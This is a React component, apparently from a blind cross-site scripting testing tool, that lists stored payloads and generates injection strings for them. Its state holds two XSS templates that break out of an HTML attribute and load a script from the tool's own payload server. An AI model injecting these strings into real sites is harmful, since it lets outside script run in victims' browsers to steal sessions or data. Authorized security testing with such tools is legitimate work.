import React from 'react';
import axios from 'axios';

import { API_PAYLOADS, URL_PAYLOAD} from "../helpers/constants"

const REPLACE_TAG = "##URL_ID_PAYLOAD_OR_ALIAS##"

export default class InjectionsList extends React.Component {
    constructor(props) {
        super(props)
        this.state = {
            currentAlias : "",
            aliasesOrPayloadsIDs: [""],
            useSubdomain: false,
            injections: [
                {"title":"basic", "content": `"><script src="##URL_ID_PAYLOAD_OR_ALIAS##"></script>`},
                {"title": "No quote", "content": `<script src=##URL_ID_PAYLOAD_OR_ALIAS##></script>`}
            ],
        }
    };
    // is this ugly? I have no idea if I should move this function elsewhere.
    // I need to keep the this (to set the state)
    getReplacement = () => {
        var s = document.getElementById("injectionSelect");
        this.setState({currentAlias: s.options[s.selectedIndex].value});
    }
    toggleSubdomain = () =>{
        var checked = document.getElementById("useSubdomain").checked;
        this.setState({ useSubdomain: checked });
        console.log(checked)
    }
    
    componentDidMount() {
        //TODO: fetch a new endpoint which lists all the injections payload.
        let tmp = [];
        axios.get(API_PAYLOADS)
        .then(res => {
            if (res.status !== 200) {
                throw new Error("Couldn't load payloads")
            } else {
                return res.data
            }
        }).then((rows) => {
            console.log("Payloads: ", rows.data)
            rows.data.map((row) => {
                return tmp.push([
                    row.id,
                    row.name
                ])
            })
            this.setState({
                aliasesOrPayloadsIDs: tmp
            });
            this.getReplacement()
        });
    };
    createInjection = (injection) => {
        var url = ""
        if (this.state.useSubdomain) {
            url = "https://" + this.state.currentAlias + "." + window.location.hostname // + ":" + window.location.port;
        }else {
            url = URL_PAYLOAD + this.state.currentAlias;
        }
        return injection.replace(REPLACE_TAG, url)
    }
    formatPayloadName = (payloadID, payloadName) => {
        console.log(payloadID, payloadName)
        if(payloadID && payloadName){
            return payloadID.slice(0,8) + `... (${payloadName})`
        }
        return ""
    }
    render() {
        return (
            <div className="Injections">
                <div>Injections:</div>
                Payload ID and/or alias: 
                <select id="injectionSelect" onChange={this.getReplacement}>
                    {
                        this.state.aliasesOrPayloadsIDs.map((aop) => {
                            return (
                                <option value={aop[0]}>{this.formatPayloadName(aop[0], aop[1])}</option>
                            )
                        })
                    }
                </select>
                <br />
                Use subdomain:
                <br/>
                <input type="checkbox" id="useSubdomain" onChange={this.toggleSubdomain}></input>
                <ul>
                {
                    this.state.injections.map((injection) => {
                        return (
                            <div>
                                <span>{injection.title}</span>
                                <li>{this.createInjection(injection.content)}</li>
                            </div>
                        )
                    })
                }
                </ul>
            </div>
        );
    };
}